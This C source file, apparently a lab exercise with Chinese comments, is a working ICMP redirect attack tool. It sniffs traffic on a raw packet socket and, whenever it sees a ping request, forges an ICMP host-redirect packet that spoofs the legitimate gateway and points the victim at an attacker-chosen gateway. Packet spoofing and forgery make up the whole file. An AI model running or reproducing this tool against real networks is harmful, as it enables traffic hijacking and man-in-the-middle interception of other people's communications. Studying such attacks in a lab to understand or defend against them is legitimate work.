#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/ip_icmp.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <netinet/if_ether.h>

#define RECV_BUFFER_SIZE 65535
#define SIZE_ETHERNET 14

unsigned short in_cksum(unsigned short *addr, int len);

void icmp_redirect(struct sockaddr_in *new_gw,
                   struct sockaddr_in *src_gw,
                   char *src_ippacket,
                   int socketfd_send,
                   struct sockaddr_in target);
int main(int argc, char *argv[])
{
    if (argc != 3)
    {
        printf("Usage:-gw 希望修改的网关地址 -i 原始网关地址\n");
        exit(1);
    }
    struct sockaddr_in new_gw;
    struct sockaddr_in src_gw;
    if (inet_aton(argv[1], &new_gw.sin_addr) == 0)
    {
        printf("bad ip address %s\n", argv[1]);
        exit(1);
    }
    if (inet_aton(argv[2], &src_gw.sin_addr) == 0)
    {
        printf("bad ip address %s\n", argv[2]);
        exit(1);
    }
    /* 创建发送套接字 */
    int socketfd_send = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (socketfd_send < 0)
    {
        perror("socket error!");
        exit(1);
    }
    /* 创建接受套接字 */
    /* PF_PACKTET 这个套接字比较强大,创建这种套接字可以监听网卡上的所有数据帧 */
    int socketfd_recv = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_IP));
    if (socketfd_recv < 0)
    {
        perror("socket error!");
        exit(1);
    }
    /* 数据接受缓冲区 */
    char *recv_buffer = (char *)malloc(sizeof(char) * RECV_BUFFER_SIZE);
    memset(recv_buffer, 0, RECV_BUFFER_SIZE);
    /* 数据包源地址缓冲区 */
    struct sockaddr_in from;
    int from_len = sizeof(from);
    memset(&from, 0 ,from_len);
    /* 数据包IP协议头 */
    struct ip *piph = NULL;
    struct icmp *picmp = NULL;
    int i = 0;
    // int count = 100;
    // while (1)
    // {
    //     // count--;
    //     int n = recvfrom(socketfd_recv, recv_buffer, RECV_BUFFER_SIZE, 0, (struct sockaddr *)&from, &from_len);
    //     if (n < 0)
    //     {
    //         perror("receive error!\n");
    //         exit(1);
    //     }
    //     i++;
    //     piph = (struct ip *)recv_buffer;
    //     int iph_len = (piph->ip_hl) * 4;
    //     printf("No. %d %s", i, inet_ntoa(piph->ip_src));
    //     printf(" -> %s ", inet_ntoa(piph->ip_dst));
    //     picmp = (struct icmp *)(recv_buffer + iph_len);
    //     printf("ICMP type:%d\n", picmp->icmp_type);
    //     if (picmp->icmp_type == ICMP_ECHO)
    //         icmp_redirect(&new_gw, &src_gw, recv_buffer, socketfd_send, from);
    // }
    // printf("Success!");
    while (1)
    {
        /* 接受发送到本机的以太网帧 */
        int n = recvfrom(socketfd_recv, recv_buffer, RECV_BUFFER_SIZE, 0, NULL, NULL);
        if (n < 0)
        {
            perror("receive error!\n");
            exit(1);
        }
        i++;
        /* ip报文头 */
        piph = (struct ip *)(recv_buffer + SIZE_ETHERNET);
        int iph_len = (piph->ip_hl) * 4;
        printf("No. %d %s", i, inet_ntoa(piph->ip_src));
        printf(" -> %s ", inet_ntoa(piph->ip_dst));
        picmp = (struct icmp *)(recv_buffer + SIZE_ETHERNET + iph_len);
        printf("ICMP type:%d\n", picmp->icmp_type);
        from.sin_addr = piph->ip_src;
        if (picmp->icmp_type == ICMP_ECHO)
        {
            icmp_redirect(&new_gw, &src_gw, recv_buffer, socketfd_send, from);
            printf("send called\n");
        }
    }
    printf("Success!");
}

#define ICMP_HL 8
#define IP_HL 20
void icmp_redirect(struct sockaddr_in *new_gw,
                   struct sockaddr_in *src_gw,
                   char *src_ippacket,
                   int socketfd_send,
                   struct sockaddr_in target)
{
    char *psend_packet;
    struct ip *src_piph = (struct ip *)(src_ippacket + SIZE_ETHERNET);
    int src_iphl = (src_piph->ip_hl) * 4;
    int send_icmp_data_len = src_iphl + 8;
    int send_packet_len = IP_HL + ICMP_HL + send_icmp_data_len;
    psend_packet = (char *)malloc(sizeof(char) * send_packet_len);
    memset(psend_packet, 0, send_packet_len);

    struct ip *psend_iph = (struct ip *)psend_packet;
    struct icmp *psend_icmph = (struct icmp *)(psend_packet + IP_HL);

    psend_iph->ip_v = 4;
    psend_iph->ip_hl = 5;
    psend_iph->ip_tos = 0;
    psend_iph->ip_len = htons(send_packet_len);
    psend_iph->ip_id = htons(0);
    psend_iph->ip_off = htons(0);
    psend_iph->ip_ttl = 255;
    psend_iph->ip_p = IPPROTO_ICMP;
    psend_iph->ip_sum = 0;
    psend_iph->ip_src = src_gw->sin_addr;
    psend_iph->ip_dst = target.sin_addr;

    psend_icmph->icmp_type = ICMP_REDIRECT;
    psend_icmph->icmp_code = ICMP_REDIRECT_HOST;
    psend_icmph->icmp_cksum = 0;
    psend_icmph->icmp_id = 2;
    psend_icmph->icmp_seq = 3;

    psend_icmph->icmp_hun.ih_gwaddr = new_gw->sin_addr;
    memcpy(psend_packet + IP_HL + ICMP_HL, src_ippacket+SIZE_ETHERNET, src_iphl + 8);

    // int i = 0;
    // for (i = 0; i < src_iphl; i++)
    //     *(psend_packet + IP_HL + ICMP_HL + i) = src_ippacket[SIZE_ETHERNET + i];
    // for (i = 0; i < 8; i++)
    //     *(psend_packet + IP_HL + ICMP_HL + src_iphl + i) = src_ippacket[SIZE_ETHERNET + src_iphl + i];
    psend_icmph->icmp_cksum = in_cksum((unsigned short *)(psend_packet + IP_HL), ICMP_HL + send_icmp_data_len);
    sendto(socketfd_send, psend_packet, send_packet_len, 0, (struct sockaddr *)&target, sizeof(target));
}

unsigned short in_cksum(unsigned short *addr, int len)
{
    int sum = 0;
    unsigned short res = 0;
    while (len > 1)
    {
        sum += *addr++;
        len -= 2;
        // printf("sum is %x.\n",sum);
    }
    if (len == 1)
    {
        *((unsigned char *)(&res)) = *((unsigned char *)addr);
        sum += res;
    }
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    res = ~sum;
    return res;
}